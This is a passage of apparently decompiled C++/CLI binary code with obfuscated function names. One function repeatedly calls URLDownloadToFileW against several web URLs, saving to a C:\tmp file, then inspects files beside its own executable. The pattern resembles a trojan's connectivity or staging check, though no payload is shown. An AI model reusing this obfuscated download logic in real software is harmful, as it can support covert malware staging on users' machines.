              \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar6);
            }
            \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar6);
label_32:
            ++num2;
          }
          while (num2 < 6);
          if (num1 > 0)
            goto label_12;
        }
        __fault
        {
          // ISSUE: method pointer
          // ISSUE: cast to a function pointer type
          \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor), (void*) &stdAllocatorChar4);
        }
        \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor(&stdAllocatorChar4);
      }
      __fault
      {
        // ISSUE: method pointer
        // ISSUE: cast to a function pointer type
        \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_ofstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor), (void*) &stdCharTraitsChar);
      }
      \u003CModule\u003E.std\u002Ebasic_ofstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor(&stdCharTraitsChar);
    }
    __fault
    {
      // ISSUE: method pointer
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor), (void*) &stdAllocatorChar1);
    }
    \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor(&stdAllocatorChar1);
  }

  internal static unsafe basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E* aXLVPYqECrV(
    [In] basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E* obj0)
  {
    uint num1;
    // ISSUE: fault handler
    try
    {
      num1 = 0U;
      allocator\u003Cwchar_t\u003E allocatorWcharT1;
      allocator\u003Cwchar_t\u003E* allocatorWcharTPtr = \u003CModule\u003E.std\u002Eallocator\u003Cwchar_t\u003E\u002E\u007Bctor\u007D(&allocatorWcharT1);
      allocator\u003Cwchar_t\u003E allocatorWcharT2;
      \u003CModule\u003E.std\u002Eallocator\u003Cwchar_t\u003E\u002E\u007Bctor\u007D(&allocatorWcharT2, allocatorWcharTPtr);
      void* voidPtr = \u003CModule\u003E.@new(4U);
      _Aux_cont* auxContPtr1 = (_Aux_cont*) voidPtr;
      vector\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E stdAllocatorWcharT;
      _Aux_cont* auxContPtr2;
      // ISSUE: fault handler
      try
      {
        if ((IntPtr) voidPtr != IntPtr.Zero)
        {
          *(int*) voidPtr = (int) &stdAllocatorWcharT;
          auxContPtr2 = (_Aux_cont*) voidPtr;
        }
        else
          auxContPtr2 = (_Aux_cont*) 0;
      }
      __fault
      {
        \u003CModule\u003E.delete((void*) auxContPtr1, voidPtr);
      }
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      ^(int&) ref stdAllocatorWcharT = (int) auxContPtr2;
      // ISSUE: fault handler
      try
      {
        \u003CModule\u003E.std\u002Eallocator\u003Cwchar_t\u003E\u002E\u007Bctor\u007D((allocator\u003Cwchar_t\u003E*) ((IntPtr) &stdAllocatorWcharT + 8), allocatorWcharTPtr);
      }
      __fault
      {
        // ISSUE: method pointer
        // ISSUE: cast to a function pointer type
        \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002E_Container_base_aux_alloc_real\u003Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT);
      }
      // ISSUE: fault handler
      try
      {
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        ^(int&) ((IntPtr) &stdAllocatorWcharT + 12) = 0;
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        ^(int&) ((IntPtr) &stdAllocatorWcharT + 16) = 0;
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        ^(int&) ((IntPtr) &stdAllocatorWcharT + 20) = 0;
      }
      __fault
      {
        // ISSUE: method pointer
        // ISSUE: cast to a function pointer type
        \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002E_Vector_val\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT);
      }
      // ISSUE: fault handler
      try
      {
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        int num2 = ^(int&) ((IntPtr) &stdAllocatorWcharT + 16) - ^(int&) ((IntPtr) &stdAllocatorWcharT + 12) >> 1;
        uint moduleFileNameW;
        do
        {
          uint _Newsize = (uint) (num2 + 260);
          \u003CModule\u003E.std\u002Evector\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Eresize(&stdAllocatorWcharT, _Newsize, char.MinValue);
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          uint num3 = (uint) (^(int&) ((IntPtr) &stdAllocatorWcharT + 16) - ^(int&) ((IntPtr) &stdAllocatorWcharT + 12) >> 1);
          moduleFileNameW = \u003CModule\u003E.GetModuleFileNameW((HINSTANCE__*) 0, \u003CModule\u003E.std\u002Evector\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Eat(&stdAllocatorWcharT, 0U), num3);
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          num2 = ^(int&) ((IntPtr) &stdAllocatorWcharT + 16) - ^(int&) ((IntPtr) &stdAllocatorWcharT + 12) >> 1;
        }
        while (moduleFileNameW >= (uint) num2);
        \u003CModule\u003E.std\u002Evector\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Eresize(&stdAllocatorWcharT, moduleFileNameW, char.MinValue);
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        char* chPtr1 = (char*) ^(int&) ((IntPtr) &stdAllocatorWcharT + 16);
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        if ((uint) ^(int&) ((IntPtr) &stdAllocatorWcharT + 12) > (uint) ^(int&) ((IntPtr) &stdAllocatorWcharT + 16))
          \u003CModule\u003E._invalid_parameter_noinfo();
        _Vector_iterator\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E _Last;
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        ^(int&) ref _Last = ^(int&) ref stdAllocatorWcharT;
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        ^(int&) ((IntPtr) &_Last + 4) = (int) chPtr1;
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        char* chPtr2 = (char*) ^(int&) ((IntPtr) &stdAllocatorWcharT + 12);
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        if ((uint) ^(int&) ((IntPtr) &stdAllocatorWcharT + 12) > (uint) ^(int&) ((IntPtr) &stdAllocatorWcharT + 16))
          \u003CModule\u003E._invalid_parameter_noinfo();
        _Vector_iterator\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E _First;
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        ^(int&) ref _First = ^(int&) ref stdAllocatorWcharT;
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        ^(int&) ((IntPtr) &_First + 4) = (int) chPtr2;
        \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bctor\u007D\u003Cclass\u0020std\u003A\u003A_Vector_iterator\u003Cwchar_t\u002Cclass\u0020std\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u003E(obj0, _First, _Last);
        num1 = 1U;
      }
      __fault
      {
        // ISSUE: method pointer
        // ISSUE: cast to a function pointer type
        \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Evector\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT);
      }
      // ISSUE: fault handler
      try
      {
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        if (^(int&) ((IntPtr) &stdAllocatorWcharT + 12) != 0)
        {
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          \u003CModule\u003E.std\u002Eallocator\u003Cwchar_t\u003E\u002Edeallocate((allocator\u003Cwchar_t\u003E*) ((IntPtr) &stdAllocatorWcharT + 8), (char*) ^(int&) ((IntPtr) &stdAllocatorWcharT + 12), (uint) (^(int&) ((IntPtr) &stdAllocatorWcharT + 20) - ^(int&) ((IntPtr) &stdAllocatorWcharT + 12) >> 1));
        }
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        ^(int&) ((IntPtr) &stdAllocatorWcharT + 12) = 0;
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        ^(int&) ((IntPtr) &stdAllocatorWcharT + 16) = 0;
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        ^(int&) ((IntPtr) &stdAllocatorWcharT + 20) = 0;
      }
      __fault
      {
        // ISSUE: method pointer
        // ISSUE: cast to a function pointer type
        \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002E_Vector_val\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT);
      }
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      \u003CModule\u003E.delete((void*) ^(int&) ref stdAllocatorWcharT);
      return obj0;
    }
    __fault
    {
      if (((int) num1 & 1) != 0)
      {
        uint num4 = num1 & 4294967294U;
        // ISSUE: method pointer
        // ISSUE: cast to a function pointer type
        \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) obj0);
      }
    }
  }

  [return: MarshalAs(UnmanagedType.U1)]
  internal static unsafe bool rHFG()
  {
    uint num1 = 0;
    if (0 != \u003CModule\u003E.URLDownloadToFileW((IUnknown*) 0, (char*) &\u003CModule\u003E.\u003F\u003F_C\u0040_1KM\u0040PNEBDIFD\u0040\u003F\u0024AAh\u003F\u0024AAt\u003F\u0024AAt\u003F\u0024AAp\u003F\u0024AAs\u003F\u0024AA\u003F3\u003F\u0024AA\u003F1\u003F\u0024AA\u003F1\u003F\u0024AAw\u003F\u0024AAw\u003F\u0024AAw\u003F\u0024AA\u003F4\u003F\u0024AAg\u003F\u0024AAo\u003F\u0024AAo\u003F\u0024AAg\u003F\u0024AAl\u003F\u0024AAe\u003F\u0024AA\u003F4\u003F\u0024AAc\u003F\u0024AAo\u003F\u0024AAm\u003F\u0024AA\u003F4\u003F\u0024AAb\u003F\u0024AAr\u003F\u0024AA\u003F1\u003F\u0024AAi\u003F\u0024AAm\u003F\u0024AAa\u003F\u0024AAg\u003F\u0024AAe\u003F\u0024AAs\u0040, (char*) &\u003CModule\u003E.\u003F\u003F_C\u0040_1O\u0040LJOFMPMD\u0040\u003F\u0024AAC\u003F\u0024AA\u003F3\u003F\u0024AA\u003F2\u003F\u0024AAt\u003F\u0024AAm\u003F\u0024AAp\u003F\u0024AA\u003F\u0024AA\u0040, 0U, (IBindStatusCallback*) 0) && 0 != \u003CModule\u003E.URLDownloadToFileW((IUnknown*) 0, (char*) &\u003CModule\u003E.\u003F\u003F_C\u0040_1HK\u0040LDJIEPBJ\u0040\u003F\u0024AAh\u003F\u0024AAt\u003F\u0024AAt\u003F\u0024AAp\u003F\u0024AA\u003F3\u003F\u0024AA\u003F1\u003F\u0024AA\u003F1\u003F\u0024AAf\u003F\u0024AA\u003F4\u003F\u0024AAi\u003F\u0024AA\u003F4\u003F\u0024AAu\u003F\u0024AAo\u003F\u0024AAl\u003F\u0024AA\u003F4\u003F\u0024AAc\u003F\u0024AAo\u003F\u0024AAm\u003F\u0024AA\u003F4\u003F\u0024AAb\u003F\u0024AAr\u003F\u0024AA\u003F1\u003F\u0024AAf\u003F\u0024AAo\u003F\u0024AAl\u003F\u0024AAh\u003F\u0024AAa\u003F\u0024AA\u003F1\u003F\u0024AAf\u003F\u0024AAu\u003F\u0024AAr\u003F\u0024AAn\u0040, (char*) &\u003CModule\u003E.\u003F\u003F_C\u0040_1O\u0040LJOFMPMD\u0040\u003F\u0024AAC\u003F\u0024AA\u003F3\u003F\u0024AA\u003F2\u003F\u0024AAt\u003F\u0024AAm\u003F\u0024AAp\u003F\u0024AA\u003F\u0024AA\u0040, 0U, (IBindStatusCallback*) 0) && 0 != \u003CModule\u003E.URLDownloadToFileW((IUnknown*) 0, (char*) &\u003CModule\u003E.\u003F\u003F_C\u0040_1HC\u0040LFGGALLO\u0040\u003F\u0024AAh\u003F\u0024AAt\u003F\u0024AAt\u003F\u0024AAp\u003F\u0024AA\u003F3\u003F\u0024AA\u003F1\u003F\u0024AA\u003F1\u003F\u0024AAc\u003F\u0024AAd\u003F\u0024AAn\u003F\u0024AA\u003F9\u003F\u0024AAc\u003F\u0024AAa\u003F\u0024AAt\u003F\u0024AAv\u003F\u0024AAe\u003F\u0024AA\u003F4\u003F\u0024AAt\u003F\u0024AAr\u003F\u0024AAr\u003F\u0024AAs\u003F\u0024AAf\u003F\u0024AA\u003F4\u003F\u0024AAc\u003F\u0024AAo\u003F\u0024AAm\u003F\u0024AA\u003F1\u003F\u0024AAn\u003F\u0024AAo\u003F\u0024AAv\u003F\u0024AAo\u003F\u0024AA\u003F1\u0040, (char*) &\u003CModule\u003E.\u003F\u003F_C\u0040_1O\u0040LJOFMPMD\u0040\u003F\u0024AAC\u003F\u0024AA\u003F3\u003F\u0024AA\u003F2\u003F\u0024AAt\u003F\u0024AAm\u003F\u0024AAp\u003F\u0024AA\u003F\u0024AA\u0040, 0U, (IBindStatusCallback*) 0) && 0 != \u003CModule\u003E.URLDownloadToFileW((IUnknown*) 0, (char*) &\u003CModule\u003E.\u003F\u003F_C\u0040_1IC\u0040BDIMMPIB\u0040\u003F\u0024AAh\u003F\u0024AAt\u003F\u0024AAt\u003F\u0024AAp\u003F\u0024AA\u003F3\u003F\u0024AA\u003F1\u003F\u0024AA\u003F1\u003F\u0024AAs\u003F\u0024AAt\u003F\u0024AAa\u003F\u0024AAt\u003F\u0024AAi\u003F\u0024AAc\u003F\u0024AAs\u003F\u0024AA\u003F4\u003F\u0024AAe\u003F\u0024AAs\u003F\u0024AAt\u003F\u0024AAa\u003F\u0024AAd\u003F\u0024AAa\u003F\u0024AAo\u003F\u0024AA\u003F4\u003F\u0024AAc\u003F\u0024AAo\u003F\u0024AAm\u003F\u0024AA\u003F4\u003F\u0024AAb\u003F\u0024AAr\u003F\u0024AA\u003F1\u003F\u0024AAs\u003F\u0024AA2\u0040, (char*) &\u003CModule\u003E.\u003F\u003F_C\u0040_1O\u0040LJOFMPMD\u0040\u003F\u0024AAC\u003F\u0024AA\u003F3\u003F\u0024AA\u003F2\u003F\u0024AAt\u003F\u0024AAm\u003F\u0024AAp\u003F\u0024AA\u003F\u0024AA\u0040, 0U, (IBindStatusCallback*) 0))
      return true;
    int num2 = 0;
    basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E stdAllocatorWcharT1;
    \u003CModule\u003E.aXLVPYqECrV(&stdAllocatorWcharT1);
    basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar1;
    basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar2;
    basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar3;
    // ISSUE: fault handler
    try
    {
      char* chPtr1 = \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Ec_str(&stdAllocatorWcharT1);
      char* chPtr2 = chPtr1;
      if ((short) *chPtr1 != (short) 0)
      {
        do
        {
          ++chPtr2;
        }
        while ((short) *chPtr2 != (short) 0);
      }
      uint num3 = (uint) (((IntPtr) chPtr2 - (IntPtr) chPtr1 >> 1) * 2 + 2);
      sbyte* numPtr = (sbyte*) \u003CModule\u003E.new\u005B\u005D(num3);
      uint num4;
      \u003CModule\u003E.wcstombs_s(&num4, numPtr, num3, chPtr1, num3);
      _String_iterator\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E stdAllocatorWcharT2;
      _String_iterator\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E _Last = *\u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Eend(&stdAllocatorWcharT1, &stdAllocatorWcharT2);
      _String_iterator\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E stdAllocatorWcharT3;
      _String_iterator\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E _First = *\u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Ebegin(&stdAllocatorWcharT1, &stdAllocatorWcharT3);
      allocator\u003Cchar\u003E allocatorChar;
      \u003CModule\u003E.std\u002E_String_val\u003Cchar\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D((_String_val\u003Cchar\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E*) &stdAllocatorChar1, \u003CModule\u003E.std\u002Eallocator\u003Cchar\u003E\u002E\u007Bctor\u007D(&allocatorChar));
      \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E_Tidy(&stdAllocatorChar1, false, 0U);
      forward_iterator_tag __unnamed002;
      \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E_Construct\u003Cclass\u0020std\u003A\u003A_String_iterator\u003Cwchar_t\u002Cstruct\u0020std\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cclass\u0020std\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u003E(&stdAllocatorChar1, _First, _Last, __unnamed002);
      // ISSUE: fault handler
      try
      {
        uint lastOf = \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Efind_last_of(&stdAllocatorChar1, (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_01LFCBOECM\u0040\u003F4\u003F\u0024AA\u0040, *\u003CModule\u003E.__imp_\u003Fnpos\u0040\u003F\u0024basic_string\u0040DU\u003F\u0024char_traits\u0040D\u0040std\u0040\u0040V\u003F\u0024allocator\u0040D\u00402\u0040\u0040std\u0040\u00402IB);
        basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar4;
        basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* stdAllocatorCharPtr1 = \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Esubstr(&stdAllocatorChar1, &stdAllocatorChar4, 0U, lastOf);
        // ISSUE: fault handler
        try
        {
          \u003CModule\u003E.std\u002Eoperator\u002B\u003Cchar\u002Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u002Cclass\u0020std\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E(&stdAllocatorChar2, stdAllocatorCharPtr1, (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_01KICIPPFI\u0040\u003F2\u003F\u0024AA\u0040);
        }
        __fault
        {
          // ISSUE: method pointer
          // ISSUE: cast to a function pointer type
          \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar4);
        }
        // ISSUE: fault handler
        try
        {
          \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar4);
          basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar5;
          \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D(&stdAllocatorChar5, numPtr);
          bool flag1;
          // ISSUE: fault handler
          try
          {
            num1 = 1U;
            uint fileAttributesA1 = \u003CModule\u003E.GetFileAttributesA(\u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Ec_str(&stdAllocatorChar5));
            basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar6;
            int num5;
            if (fileAttributesA1 == uint.MaxValue || ((int) fileAttributesA1 & 16) != 0)
            {
              \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D(&stdAllocatorChar6, \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Ec_str(&stdAllocatorChar2));
              // ISSUE: fault handler
              try
              {
                num1 = 3U;
                uint fileAttributesA2 = \u003CModule\u003E.GetFileAttributesA(\u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Ec_str(&stdAllocatorChar6));
                if (fileAttributesA2 != uint.MaxValue)
                {
                  if (((int) fileAttributesA2 & 16) != 0)
                    goto label_18;
                }
                num5 = 1;
                goto label_23;
              }
              __fault
              {
                if (((int) num1 & 2) != 0)
                {
                  num1 &= 4294967293U;
                  // ISSUE: method pointer
                  // ISSUE: cast to a function pointer type
                  \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar6);
                }
              }
            }
label_18:
            // ISSUE: fault handler
            try
            {
              num5 = 0;
            }
            __fault
            {
              if (((int) num1 & 2) != 0)
              {
                num1 &= 4294967293U;
                // ISSUE: method pointer
                // ISSUE: cast to a function pointer type
                \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar6);
              }
            }
label_23:
            // ISSUE: fault handler
            try
            {
              flag1 = num5 != 0;
            }
            __fault
            {
              if (((int) num1 & 2) != 0)
              {
                num1 &= 4294967293U;
                // ISSUE: method pointer
                // ISSUE: cast to a function pointer type
                \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar6);
              }
            }
            if (((int) num1 & 2) != 0)
            {
              num1 &= 4294967293U;
              \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar6);
            }
          }
          __fault
          {
            if (((int) num1 & 1) != 0)
            {
              num1 &= 4294967294U;
              // ISSUE: method pointer
              // ISSUE: cast to a function pointer type
              \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar5);
            }
          }
          if (((int) num1 & 1) != 0)
          {
            uint num6 = num1 & 4294967294U;
            \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar5);
          }
          if (flag1)
            num2 = 1;
          \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D(&stdAllocatorChar3);
          // ISSUE: fault handler
          try
          {
            basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar7;
